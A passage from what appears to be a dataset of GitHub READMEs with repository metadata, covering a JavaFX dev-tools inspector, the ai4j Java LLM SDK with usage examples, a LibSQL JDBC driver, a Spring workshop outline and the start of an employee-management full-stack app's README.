<p align=""center"">
<img src=""https://raw.githubusercontent.com/mkpaz/devtoolsfx/master/.screenshots/inspector.png"" alt=""inspector""/>
</p>

Find more screenshots [here](https://github.com/mkpaz/devtoolsfx/tree/master/.screenshots).

## Getting started

Maven:

```xml

<dependency>
    <groupId>io.github.mkpaz</groupId>
    <artifactId>devtoolsfx-gui</artifactId>
    <version>TBD</version>
</dependency>
```

Gradle:

```groovy
dependencies {
    implementation 'io.github.mkpaz:devtoolsfx-gui:TBD'
}
```

After the primary stage is shown, you can launch the dev tools GUI at any time with:

```java
primaryStage.setOnShown(
    e -> GUI.openToolStage(primaryStage, getHostServices())
);
```

Check the `devtoolsfx.gui.GUI` class for additional ways to launch the dev tools, such as embedding it at the top or
bottom. Also, refer to the demo for a more detailed example.
",0,1,1,mit,0.0,"['devtoolsfx', 'devtoolsfx', 'tool', 'navigating', 'application', 'scene', 'graph', 'exploring', 'node', 'property', 'aim', 'similar', 'chrome', 'devtools', 'javafx', 'lightweight', 'around', 'kb', 'dependency', 'allowing', 'easily', 'embed', 'app', 'javafx', 'dependency', 'app', 'need', 'regardless', 'find', 'screenshots', 'getting', 'started', 'maven', 'gradle', 'primary', 'stage', 'shown', 'launch', 'dev', 'tool', 'gui', 'time', 'check', 'class', 'additional', 'way', 'launch', 'dev', 'tool', 'embedding', 'top', 'bottom', 'also', 'refer', 'demo', 'detailed', 'example']","['tool', 'devtoolsfx', 'javafx', 'dependency', 'app']",1,0,0,"['devtoolsfx', 'get', 'start']",2,"['devtoolsfx', 'get', 'start']",3,0.0,4.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.openjfx:javafx-maven-plugin]",0.0,3.0,1.0,1232,24.857142857142858,5.304597701149425,['here -> https://github.com/mkpaz/devtoolsfx/tree/master/.screenshots'],1
LnYo-Cly/ai4j,main,"![Maven Central](https://img.shields.io/maven-central/v/io.github.lnyo-cly/ai4j?color=blue)
# ai4j
由于SpringAI需要使用JDK17和Spring Boot3， 但是目前很多应用依旧使用的JDK8版本，所以使用可以支持JDK8的AI4J来接入OpenAI等大模型。  
一款JavaSDK用于快速接入AI大模型应用，整合多平台大模型，如OpenAi、Ollama、智谱Zhipu(ChatGLM)、深度求索DeepSeek、月之暗面Moonshot(Kimi)、腾讯混元Hunyuan、零一万物(01)、MiniMax、百川Baichuan等等，提供统一的输入输出(对齐OpenAi)消除差异化，优化函数调用(Tool Call)，优化RAG调用、支持向量数据库(Pinecone)，并且支持JDK1.8，为用户提供快速整合AI的能力。


## 支持的平台
+ OpenAi
+ Zhipu(智谱)
+ DeepSeek(深度求索)
+ Moonshot(月之暗面)
+ Hunyuan(腾讯混元)
+ Lingyi(零一万物)
+ Ollama
+ MiniMax
+ Baichuan

##待添加
+ LLM(Qwen、Llama、Mistral...)
+ MLLM(Gemini、InternVL...)
+ t2i(stable diffusion、imagen...)

## 支持的服务
+ Chat Completions（流式与非流式）
+ Embedding
+ Audio
+ Realtime
+ 待添加

## 特性
+ 支持Spring以及普通Java应用、支持Java 8以上的应用
+ 多平台、多服务
+ 统一的输入输出
+ 统一的错误处理
+ 支持SPI机制，可自定义Dispatcher和ConnectPool
+ 支持流式输出。支持函数调用参数流式输出
+ 轻松使用Tool Calls
+ 支持多个函数同时调用（智谱不支持）
+ 支持stream_options，流式输出直接获取统计token usage
+ 支持RAG，内置向量数据库支持: Pinecone
+ 使用Tika读取文件
+ Token统计`TikTokensUtil.java`

## 更新日志
+ [2024-10-17] 支持SPI机制，可自定义Dispatcher和ConnectPool。新增百川Baichuan平台Chat接口支持。
+ [2024-10-16] 增加MiniMax平台Chat接口对接
+ [2024-10-15] 增加realtime服务
+ [2024-10-12] 修复早期遗忘的小bug; 修复错误拦截器导致的音频字节流异常错误问题; 增加OpenAi Audio服务。
+ [2024-10-10] 增强对SSE输出的获取，新加入`currData`属性，记录当前消息的整个对象。而原先的`currStr`为当前消息的content内容，保留不变。
+ [2024-09-26] 修复有关Pinecone向量数据库的一些问题。发布0.6.3版本
+ [2024-09-20] 增加对Ollama平台的支持，并修复一些bug。发布0.6.2版本
+ [2024-09-19] 增加错误处理链，统一处理为openai错误类型; 修复部分情况下URL拼接问题，修复拦截器中response重复调用而导致的关闭问题。发布0.5.3版本
+ [2024-09-12] 修复上个问题OpenAi参数导致错误的遗漏，发布0.5.2版本
+ [2024-09-12] 修复SpringBoot 2.6以下导致OkHttp变为3.14版本的报错问题；修复OpenAi参数`parallel_tool_calls`在tools为null时的异常问题。发布0.5.1版本。
+ [2024-09-09] 新增零一万物大模型支持、发布0.5.0版本。
+ [2024-09-02] 新增腾讯混元Hunyuan平台支持（注意：所需apiKey 属于SecretId与SecretKey的拼接，格式为 {SecretId}.{SecretKey}），发布0.4.0版本。
+ [2024-08-30] 新增对Moonshot(Kimi)平台的支持，增加`OkHttpUtil.java`实现忽略SSL证书的校验。
+ [2024-08-29] 新增对DeepSeek平台的支持、新增stream_options可以直接统计usage、新增错误拦截器`ErrorInterceptor.java`、发布0.3.0版本。
+ [2024-08-29] 修改SseListener以兼容智谱函数调用。
+ [2024-08-28] 添加token统计、添加智谱AI的Chat服务、优化函数调用可以支持多轮多函数。
+ [2024-08-17] 增强SseListener监听器功能。发布0.2.0版本。

## 教程文档
+ [快速接入SpringBoot、接入流式与非流式以及函数调用](http://t.csdnimg.cn/iuIAW)
+ [Java快速接入qwen2.5、llama3.1等Ollama平台开源大模型](https://blog.csdn.net/qq_35650513/article/details/142408092?spm=1001.2014.3001.5501)
+ [Java搭建法律AI助手，快速实现RAG应用](https://blog.csdn.net/qq_35650513/article/details/142568177?fromshare=blogdetail&sharetype=blogdetail&sharerId=142568177&sharerefer=PC&sharesource=qq_35650513&sharefrom=from_link)

## 其它支持
+ [[低价中转平台] 低价ApiKey—限时特惠 支持最新o1模型](https://api.trovebox.online/)

# 快速开始
## 导入
### Gradle
```groovy
implementation group: 'io.github.lnyo-cly', name: 'ai4j', version: '${project.version}'
```

```groovy
implementation group: 'io.github.lnyo-cly', name: 'ai4j-spring-boot-starter', version: '${project.version}'
```


### Maven
```xml
<!-- 非Spring应用 -->
<dependency>
    <groupId>io.github.lnyo-cly</groupId>
    <artifactId>ai4j</artifactId>
    <version>${project.version}</version>
</dependency>

```
```xml
<!-- Spring应用 -->
<dependency>
    <groupId>io.github.lnyo-cly</groupId>
    <artifactId>ai4j-spring-boot-starter</artifactId>
    <version>${project.version}</version>
</dependency>
```

## 获取AI服务实例

### 非Spring获取
```java
    public void test_init(){
        OpenAiConfig openAiConfig = new OpenAiConfig();

        Configuration configuration = new Configuration();
        configuration.setOpenAiConfig(openAiConfig);

        HttpLoggingInterceptor httpLoggingInterceptor = new HttpLoggingInterceptor();
        httpLoggingInterceptor.setLevel(HttpLoggingInterceptor.Level.HEADERS);

        OkHttpClient okHttpClient = new OkHttpClient
                .Builder()
                .addInterceptor(httpLoggingInterceptor)
                .addInterceptor(new ErrorInterceptor())
                .connectTimeout(300, TimeUnit.SECONDS)
                .writeTimeout(300, TimeUnit.SECONDS)
                .readTimeout(300, TimeUnit.SECONDS)
                .proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(""127.0.0.1"",10809)))
                .build();
        configuration.setOkHttpClient(okHttpClient);

        AiService aiService = new AiService(configuration);

        embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);
        chatService = aiService.getChatService(PlatformType.getPlatform(""OPENAI""));

    }
```
### Spring获取
```yml
# 国内访问默认需要代理
ai:
  openai:
    api-key: ""api-key""
  okhttp:
    proxy-port: 10809
    proxy-url: ""127.0.0.1""
  zhipu:
    api-key: ""xxx""
  #other...
```

```java
// 注入Ai服务
@Autowired
private AiService aiService;

// 获取需要的服务实例
IChatService chatService = aiService.getChatService(PlatformType.OPENAI);
IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);
// ......
```

## Chat服务

### 同步请求调用
```java

public void test_chat() throws Exception {
    // 获取chat服务实例
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // 构建请求参数
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""鲁迅为什么打周树人""))
            .build();

    // 发送对话请求
    ChatCompletionResponse response = chatService.chatCompletion(chatCompletion);

    System.out.println(response);
}

```

### 流式调用
```java
public void test_chat_stream() throws Exception {
    // 获取chat服务实例
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // 构造请求参数
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""查询北京明天的天气""))
            .functions(""queryWeather"")
            .build();


    // 构造监听器
    SseListener sseListener = new SseListener() {
        @Override
        protected void send() {
            System.out.println(this.getCurrStr());
        }
    };
    // 显示函数参数，默认不显示
    sseListener.setShowToolArgs(true);

    // 发送SSE请求
    chatService.chatCompletionStream(chatCompletion, sseListener);

    System.out.println(sseListener.getOutput());

}
```

### 图片识别

```java
public void test_chat_image() throws Exception {
    // 获取chat服务实例
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // 构建请求参数
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""图片中有什么东西"", ""https://cn.bing.com/images/search?view=detailV2&ccid=r0OnuYkv&id=9A07DE578F6ED50DB59DFEA5C675AC71845A6FC9&thid=OIP.r0OnuYkvsbqBrYk3kUT53AHaKX&mediaurl=https%3a%2f%2fimg.zcool.cn%2fcommunity%2f0104c15cd45b49a80121416816f1ec.jpg%401280w_1l_2o_100sh.jpg&exph=1792&expw=1280&q=%e5%b0%8f%e7%8c%ab%e5%9b%be%e7%89%87&simid=607987191780608963&FORM=IRPRST&ck=12127C1696CF374CB9D0F09AE99AFE69&selectedIndex=2&itb=0&qpvt=%e5%b0%8f%e7%8c%ab%e5%9b%be%e7%89%87""))
            .build();

    // 发送对话请求
    ChatCompletionResponse response = chatService.chatCompletion(chatCompletion);

    System.out.println(response);
}
```

### 函数调用

```java
public void test_chat_tool_call() throws Exception {
    // 获取chat服务实例
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // 构建请求参数
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""今天北京天气怎么样""))
            .functions(""queryWeather"")
            .build();

    // 发送对话请求
    ChatCompletionResponse response = chatService.chatCompletion(chatCompletion);

    System.out.println(response);
}
```
#### 定义函数
```java
@FunctionCall(name = ""queryWeather"", description = ""查询目标地点的天气预报"")
public class QueryWeatherFunction implements Function<QueryWeatherFunction.Request, String> {

    @Data
    @FunctionRequest
    public static class Request{
        @FunctionParameter(description = ""需要查询天气的目标位置, 可以是城市中文名、城市拼音/英文名、省市名称组合、IP 地址、经纬度"")
        private String location;
        @FunctionParameter(description = ""需要查询未来天气的天数, 最多15日"")
        private int days = 15;
        @FunctionParameter(description = ""预报的天气类型，daily表示预报多天天气、hourly表示预测当天24天气、now为当前天气实况"")
        private Type type;
    }

    public enum Type{
        daily,
        hourly,
        now
    }

    @Override
    public String apply(Request request) {
        final String key = """";

        String url = String.format(""https://api.seniverse.com/v3/weather/%s.json?key=%s&location=%s&days=%d"",
                request.type.name(),
                key,
                request.location,
                request.days);


        OkHttpClient client = new OkHttpClient();

        okhttp3.Request http = new okhttp3.Request.Builder()
                .url(url)
                .get()
                .build();

        try (Response response = client.newCall(http).execute()) {
            if (response.isSuccessful()) {
                // 解析响应体
                return response.body() != null ? response.body().string() : """";
            } else {
                return ""获取天气失败 当前天气未知"";
            }
        } catch (Exception e) {
            // 处理异常
            e.printStackTrace();
            return ""获取天气失败 当前天气未知"";
        }
    }

}
```

## Embedding服务

```java
public void test_embed() throws Exception {
    // 获取embedding服务实例
    IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);

    // 构建请求参数
    Embedding embeddingReq = Embedding.builder().input(""1+1"").build();

    // 发送embedding请求
    EmbeddingResponse embeddingResp = embeddingService.embedding(embeddingReq);

    System.out.println(embeddingResp);
}
```

## RAG
### 配置向量数据库
```yml
ai:
  vector:
    pinecone:
      url: """"
      key: """"
```
### 获取实例
```java
@Autowired
private PineconeService pineconeService;
```
### 插入向量数据库
```java
public void test_insert_vector_store() throws Exception {
    // 获取embedding服务实例
    IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);

    // Tika读取file文件内容
    String fileContent = TikaUtil.parseFile(new File(""D:\\data\\test\\test.txt""));

    // 分割文本内容
    RecursiveCharacterTextSplitter recursiveCharacterTextSplitter = new RecursiveCharacterTextSplitter(1000, 200);
    List<String> contentList = recursiveCharacterTextSplitter.splitText(fileContent);

    // 转为向量
    Embedding build = Embedding.builder()
            .input(contentList)
            .model(""text-embedding-3-small"")
            .build();
    EmbeddingResponse embedding = embeddingService.embedding(build);
    List<List<Float>> vectors = embedding.getData().stream().map(EmbeddingObject::getEmbedding).collect(Collectors.toList());
    VertorDataEntity vertorDataEntity = new VertorDataEntity();
    vertorDataEntity.setVector(vectors);
    vertorDataEntity.setContent(contentList);
    
    // 向量存储
    Integer count = pineconeService.insert(vertorDataEntity, ""userId"");

}
```
### 从向量数据库查询
```java
public void test_query_vector_store() throws Exception {
    // 获取embedding服务实例
    IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);

    // 构建要查询的问题，转为向量
    Embedding build = Embedding.builder()
            .input(""question"")
            .model(""text-embedding-3-small"")
            .build();
    EmbeddingResponse embedding = embeddingService.embedding(build);
    List<Float> question = embedding.getData().get(0).getEmbedding();

    // 构建向量数据库的查询对象
    PineconeQuery pineconeQueryReq = PineconeQuery.builder()
            .namespace(""userId"")
            .vector(question)
            .build();

    String result = pineconeService.query(pineconeQueryReq, "" "");
    
    // 携带result，与chat服务进行对话
    // ......
}
```

### 删除向量数据库数据
```java
public void test_delete_vector_store() throws Exception {
    // 构建参数
    PineconeDelete pineconeDelete = PineconeDelete.builder()
                                    .deleteAll(true)
                                    .namespace(""userId"")
                                    .build();
    // 删除
    Boolean res = pineconeService.delete(pineconeDelete);
}
```



# 为AI4J提供贡献
欢迎您对AI4J提出建议、报告问题或贡献代码。您可以按照以下的方式为AI4J提供贡献: 

## 问题反馈
请使用GitHub Issue页面报告问题。尽可能具体地说明如何重现您的问题，包括操作系统、Java版本和任何相关日志跟踪等详细信息。

## PR
1. Fork 本仓库并创建您的分支。
2. 编写您的代码，并进行测试。
3. 确保您的代码符合现有的样式。
4. 提交时编写清晰的日志信息。对于小的改动，单行信息就可以了，但较大的改动应该有详细的描述。
5. 完成拉取请求表单，确保在`dev`分支进行改动，链接到您的 PR 解决的问题。

# 支持
如果您觉得这个项目对您有帮助，请点一个star⭐。


# 贡献者

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

<a href=""https://github.com/LnYo-Cly/ai4j/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=LnYo-Cly/ai4j"" />
</a>


# ⭐️ Star History
<a href=""https://star-history.com/#LnYo-Cly/ai4j&Date"">
 <picture>
   <source media=""(prefers-color-scheme: dark)"" srcset=""https://api.star-history.com/svg?repos=LnYo-Cly/ai4j&type=Date&theme=dark"" />
   <source media=""(prefers-color-scheme: light)"" srcset=""https://api.star-history.com/svg?repos=LnYo-Cly/ai4j&type=Date"" />
   <img alt=""Star History Chart"" src=""https://api.star-history.com/svg?repos=LnYo-Cly/ai4j&type=Date"" />
 </picture>
</a>
",14,1,5,apache-2.0,21.0,"['chatglm', 'kimi', 'tool', 'call', 'pinecone', 'openai', 'zhipu', 'deepseek', 'moonshot', 'hunyuan', 'lingyi', 'ollama', 'minimax', 'baichuan', 'llm', 'mllm', 'stable', 'chat', 'embedding', 'audio', 'realtime', 'call', 'usage', 'pinecone', 'secretid', 'secretkey', 'kimi', 'gradle', 'maven', 'rag', 'pr', 'fork', 'pr', 'star', 'history']","['kimi', 'call', 'pinecone', 'pr', 'chatglm']",0,0,0,"['gradle', 'maven', 'rag', 'pr', 'star', 'history']",34,"['gradle', 'maven', 'rag', 'pr', 'star']",18,55.0,3.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:versions-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,2.0,1.0,13182,138.22222222222223,7.258842443729904,"['Maven Central -> https://img.shields.io/maven-central/v/io.github.lnyo-cly/ai4j?color=blue', '快速接入SpringBoot、接入流式与非流式以及函数调用 -> http://t.csdnimg.cn/iuIAW', 'Java快速接入qwen2.5、llama3.1等Ollama平台开源大模型 -> https://blog.csdn.net/qq_35650513/article/details/142408092?spm=1001.2014.3001.5501', 'Java搭建法律AI助手，快速实现RAG应用 -> https://blog.csdn.net/qq_35650513/article/details/142568177?fromshare=blogdetail&sharetype=blogdetail&sharerId=142568177&sharerefer=PC&sharesource=qq_35650513&sharefrom=from_link', '[低价中转平台] 低价ApiKey—限时特惠 支持最新o1模型 -> https://api.trovebox.online/']",5
dbeaver/dbeaver-jdbc-libsql,devel,"# LibSQL JDBC driver

[![CI](https://github.com/dbeaver/dbeaver-jdbc-libsql/actions/workflows/push-pr-devel.yml/badge.svg)](https://github.com/dbeaver/dbeaver-jdbc-libsql/actions/workflows/push-pr-devel.yml)
[![javadoc](https://javadoc.io/badge2/com.dbeaver.jdbc/com.dbeaver.jdbc.driver.libsql/javadoc.svg)](https://javadoc.io/doc/com.dbeaver.jdbc/com.dbeaver.jdbc.driver.libsql)
[![Apache 2.0](https://img.shields.io/github/license/cronn-de/jira-sync.svg)](http://www.apache.org/licenses/LICENSE-2.0)

LibSQL [JDBC](https://en.wikipedia.org/wiki/JDBC_driver) is a library for accessing and managing [LibSQL](https://github.com/tursodatabase/libsql) databases in Java.
- It is a pure Java library
- Version 1.0 uses simple [HTTP API](https://github.com/tursodatabase/libsql/blob/main/docs/http_api.md) protocol for LibSQL
- It supports prepared statements, database metadata, resultsets, data types and most of other JDBC features
- It is included in [DBeaver](https://github.com/dbeaver/dbeaver) and [CloudBeaver](https://github.com/dbeaver/cloudbeaver) as default LibSQL driver. However, it can be used in any other products/frameworks which rely on JDBC API

## License

Licensed under the [Apache License, Version 2.0](http://www.apache.org/licenses/LICENSE-2.0)

## Download
Download from Maven Central or from the releases page.
```xml
<dependencies>
    <dependency>
      <groupId>com.dbeaver.jdbc</groupId>
      <artifactId>com.dbeaver.jdbc.driver.libsql</artifactId>
      <version>1.0.0</version>
    </dependency>
</dependencies>
```
",0,0,2,apache-2.0,1.0,"['libsql', 'jdbc', 'driver', 'libsql', 'jdbc', 'library', 'accessing', 'managing', 'libsql', 'database', 'java', 'pure', 'java', 'library', 'version', 'us', 'simple', 'http', 'api', 'protocol', 'libsql', 'support', 'prepared', 'statement', 'database', 'metadata', 'resultsets', 'data', 'type', 'jdbc', 'feature', 'included', 'dbeaver', 'cloudbeaver', 'default', 'libsql', 'driver', 'however', 'used', 'rely', 'jdbc', 'api', 'license', 'licensed', 'apache', 'license', 'version', 'download', 'download', 'maven', 'central', 'release', 'page']","['libsql', 'jdbc', 'driver', 'library', 'database']",0,0,0,"['libsql', 'jdbc', 'driver', 'license', 'download']",3,"['libsql', 'jdbc', 'driver', 'license', 'download']",1,0.0,3.0,"[org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,0.0,2.0,1547,33.0,5.073593073593074,"['![CI -> https://github.com/dbeaver/dbeaver-jdbc-libsql/actions/workflows/push-pr-devel.yml/badge.svg', '![javadoc -> https://javadoc.io/badge2/com.dbeaver.jdbc/com.dbeaver.jdbc.driver.libsql/javadoc.svg', '![Apache 2.0 -> https://img.shields.io/github/license/cronn-de/jira-sync.svg', 'JDBC -> https://en.wikipedia.org/wiki/JDBC_driver', 'LibSQL -> https://github.com/tursodatabase/libsql', 'HTTP API -> https://github.com/tursodatabase/libsql/blob/main/docs/http_api.md', 'DBeaver -> https://github.com/dbeaver/dbeaver', 'CloudBeaver -> https://github.com/dbeaver/cloudbeaver', 'Apache License, Version 2.0 -> http://www.apache.org/licenses/LICENSE-2.0']",9
joshlong-attic/2024-bootiful-spring-workshop,main,"
# README 

bit.ly/spring-tips-playlist
youtube.com/@coffeesoftware

## Basics
* which IDE? IntelliJ, VSCode, and Eclipse
* your choice of Java: GraalVM
* start.spring.io, an API, website, and an IDE wizard 
* Devtools
* Docker Compose 
* Testcontainers
* banner.txt

## Development Desk Check
* the Spring JavaFormat Plugin 
	* Python, `gofmt`, your favorite IDE, and 
* the power of environment variables
* SDKMAN
	* `.sdkman`
* direnv 
	*  `.envrc`
* a good password manager for secrets 


## Data Oriented Programming in Java 21+ 
* an example

## Beans
* dependency injection from first principles
* bean configuration
* XML
* stereotype annotations
* lifecycle 
	* BeanPostProcessor
	* BeanFactoryPostProcessor
* auto configuration 
* AOP
* Spring's event publisher
* configuration processor

## AOT & GraalVM
* installing GraalVM 
* GraalVM native images 
* basics
* AOT lifecycles

## Data 
* `JdbcClient`
* SQL Initialization
* Flyway
* Spring Data JDBC

## Batch Processing 
* Spring Batch
* load some data from a CSV file to a SQL database

## Scalability 
* non-blocking IO
* virtual threads
* José Paumard's demo
* Cora Iberkleid's demo 

## Web Programming
* clients: `RestTemplate`, `RestClient`, declarative interface clients
* REST
	* controllers
	* functional style
* GraphQL 
	* batches


## Architecting for Modularity
* Privacy
* Spring Modulith 
* Externalized messages
* Testing 

## Artificial Intelligence
* what's in a model?
* Spring AI
* `ChatClient`
* prompts
* advisors
* Retrieval Augmented Generation (RAG)

## Microservices
* centralized configuration 
* API gateways 
	* reactive or not reactive
* event bus and refreshable configuration
* service registration and discovery



## Messaging and Integration
* ""What do you mean by Event Driven?""
* Messaging Technologies like RabbitMQ or Apache Kafka
* Spring Integration
* files to events


## Security 
* adding form login to an application
* authentication 
* authorization
* passkeys
* one time tokens
* OAuth 
	* the Spring Authorizatinm Server
	* OAuth clients
	* OAuth resource servers
	* protecting messaging code

## Q&A 
* I may not know, but I probably know who does know...",0,0,1,apache-2.0,0.0,"['readme', 'coffeesoftware', 'basic', 'ide', 'intellij', 'vscode', 'eclipse', 'choice', 'java', 'graalvm', 'api', 'website', 'ide', 'wizard', 'devtools', 'docker', 'compose', 'testcontainers', 'development', 'desk', 'check', 'spring', 'javaformat', 'plugin', 'python', 'favorite', 'ide', 'power', 'environment', 'variable', 'sdkman', 'direnv', 'good', 'password', 'manager', 'secret', 'data', 'oriented', 'programming', 'java', 'example', 'bean', 'dependency', 'injection', 'first', 'principle', 'bean', 'configuration', 'xml', 'stereotype', 'annotation', 'lifecycle', 'beanpostprocessor', 'beanfactorypostprocessor', 'auto', 'configuration', 'aop', 'spring', 'event', 'publisher', 'configuration', 'processor', 'aot', 'graalvm', 'installing', 'graalvm', 'graalvm', 'native', 'image', 'basic', 'aot', 'lifecycles', 'data', 'sql', 'initialization', 'flyway', 'spring', 'data', 'jdbc', 'batch', 'processing', 'spring', 'batch', 'load', 'data', 'csv', 'file', 'sql', 'database', 'scalability', 'io', 'virtual', 'thread', 'paumard', 'demo', 'cora', 'iberkleid', 'demo', 'web', 'programming', 'client', 'declarative', 'interface', 'client', 'rest', 'controller', 'functional', 'style', 'graphql', 'batch', 'architecting', 'modularity', 'privacy', 'spring', 'modulith', 'externalized', 'message', 'testing', 'artificial', 'intelligence', 'model', 'spring', 'ai', 'prompt', 'advisor', 'retrieval', 'augmented', 'generation', 'rag', 'microservices', 'centralized', 'configuration', 'api', 'gateway', 'reactive', 'reactive', 'event', 'bus', 'refreshable', 'configuration', 'service', 'registration', 'discovery', 'messaging', 'integration', 'mean', 'event', 'driven', 'messaging', 'technology', 'like', 'rabbitmq', 'apache', 'kafka', 'spring', 'integration', 'file', 'event', 'security', 'adding', 'form', 'login', 'application', 'authentication', 'authorization', 'passkey', 'one', 'time', 'token', 'oauth', 'spring', 'authorizatinm', 'server', 'oauth', 'client', 'oauth', 'resource', 'server', 'protecting', 'messaging', 'code', 'q', 'may', 'know', 'probably', 'know', 'know']","['spring', 'configuration', 'graalvm', 'data', 'event']",1,0,0,"['readme', 'basic', 'development', 'desk', 'check', 'data', 'oriented', 'programming', 'java', 'bean', 'aot', 'graalvm', 'data', 'batch', 'processing', 'scalability', 'web', 'program', 'architecting', 'modularity', 'artificial', 'intelligence', 'microservices', 'message', 'integration', 'security', 'q', 'a']",16,"['data', 'readme', 'basic', 'development', 'desk']",0,0.0,19.0,"[io.spring.javaformat:spring-javaformat-maven-plugin,org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,19.0,0.0,2168,65.25,6.14176245210728,[],0
hoangsonww/Employee-Management-Fullstack-App,master,"# Employee Management Full-Stack Application

## Table of Contents

- [Overview](#overview)
- [Live Deployment](#live-deployment)
- [Key Technologies](#key-technologies)
- [User Interface](#user-interface)
- [File Structure](#file-structure)
- [API Endpoints](#api-endpoints)
- [Backend Setup](#backend-setup)
  - [Prerequisites](#1-prerequisites)
  - [Clone the Repository](#2-clone-the-repository)
  - [Install Dependencies](#3-install-dependencies)
  - [Configure the Application](#4-configure-the-application)
  - [Start the Backend Server](#5-start-the-backend-server)
  - [Access the API Endpoints](#6-access-the-api-endpoints)
  - [API Documentation](#7-api-documentation)
    - [Overview](#overview-1)
    - [How to Access the API Documentation](#how-to-access-the-api-documentation)
    - [Benefits of Using Swagger UI](#benefits-of-using-swagger-ui)
  - [Backend JUnit Testing](#8-backend-junit-testing)
- [Frontend Setup](#frontend-setup)
  - [Clone the Repository](#1-clone-the-repository)
  - [Install Dependencies](#2-install-dependencies)
  - [Set Up Environment Variables](#3-set-up-environment-variables)
  - [Start the Development Server](#4-start-the-development-server)
  - [Build for Production](#5-build-for-production)
  - [Test the Application (Optional)](#6-test-the-application-optional)
- [Detailed Component Instructions](#detailed-component-instructions)
- [Containerization](#containerization)
- [Kubernetes](#kubernetes)
- [LoadBalancer Service](#loadbalancer-service)
- [Jenkins](#jenkins)
- [Troubleshooting](#troubleshooting)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Overview

The Employee Management System is a dynamic full-stack application that seamlessly combines cutting-edge and traditional technologies. By integrating a modern **React** frontend with a classic **Spring Boot** backend, this project demonstrates how new and established technologies can harmoniously work together to create a robust and efficient application for managing employee and department data!

## Live Deployment

The Employee Management System full-stack app is deployed with Vercel and is live at [https://employee-management-fullstack-app.vercel.app](https://employee-management-fullstack-app.vercel.app) for you to explore and interact with the application.

The backend is also deployed with Render and is available at [https://employee-management-app.onrender.com](https://employee-management-app-gdm5.onrender.com/). You can access the API endpoints directly from the browser.

**Note:** The backend API may spin down due to inactivity, so you may need to wait for up to 2 minutes for the API to start up again. Feel free to test the API endpoints and explore the application. Or, you can run the backend locally and connect it to the frontend for a more seamless experience.

Additionally, it may take a while to fetch all the data, as Render's free tier has limited resources (only 512MB RAM and 0.1 CPU). Please be patient while the data loads.

## Key Technologies

- **React (Frontend)**: A modern JavaScript library for building user interfaces, providing a responsive and interactive experience.
  - **React Router**: A routing library for React that enables navigation and URL handling in single-page applications.
  - **Chart.js**: A JavaScript library for creating responsive and customizable charts and graphs.
  - **Axios**: A promise-based HTTP client for making API requests.
  - **Tailwind CSS**: A utility-first CSS framework for creating custom designs with minimal CSS.
  - **Redux**: A predictable state container for managing application state.
  - **Jest and React Testing Library**: Testing libraries for unit and integration testing React components.
- **Java Spring Boot (Backend)**: A powerful, established Java framework for building production-ready applications with Java, offering robust backend support and data management.
  - **Spring Data JPA**: A part of the Spring Data project that makes it easy to implement JPA-based repositories.
  - **Spring Boot Actuator**: A set of production-ready features that help monitor and manage the application.
  - **Spring Hibernate**: An object-relational mapping (ORM) library for Java that provides a framework for mapping an object-oriented domain model to a relational database.
  - **Spring Boot Starter Web**: A starter for building web applications, including RESTful, application, and WebSocket services.
  - **Spring Boot Starter Data JPA**: A starter for using Spring Data JPA with Hibernate.
  - **RESTful APIs**: Representational state transfer (REST) APIs for communication between the frontend and backend.
  - **Java 11**: The latest LTS version of Java, providing long-term support and stability.
  - **JUnit 5**: A popular testing framework for Java that provides annotations for writing tests.
  - **Swagger**: A tool for documenting and testing RESTful APIs.
- **Docker**: A containerization platform for packaging applications and their dependencies.
- **Kubernetes**: An open-source container orchestration platform for automating deployment, scaling, and management of containerized applications.
- **Jenkins**: An open-source automation server that helps automate the parts of software development related to building, testing, and delivering, facilitating continuous integration and continuous delivery (CI/CD).
- **MySQL**: A reliable relational database for structured data storage.
- **MongoDB**: A flexible NoSQL database for non-relational data.
- **Style Guides**: This project follows the following popular style guides to ensure clean and consistent code.
  - **Airbnb JavaScript Style Guide**: A popular style guide for writing clean and consistent JavaScript code.
  - **Google Java Style Guide**: A style guide for writing Java code that is readable and maintainable.

## User Interface

The frontend of the Employee Management System provides a user-friendly interface for managing employees and departments. It includes features for viewing, adding, editing, and deleting employees and departments. The app also includes visualizations for employee metrics such as growth over time and distribution by age range.

The frontend is also live at [https://employee-management-fullstack-app.vercel.app](https://employee-management-fullstack-app.vercel.app) for you to explore and interact with the application. Note that the backend is not hosted, so the API calls will not work and the data will not be present.

**Landing Page:**

<p align=""center"" style=""cursor: pointer"">
  <img src=""img/landing.png"" alt=""Landing Page"" style=""border-radius: 10px"" width=""100%""/>
</p>

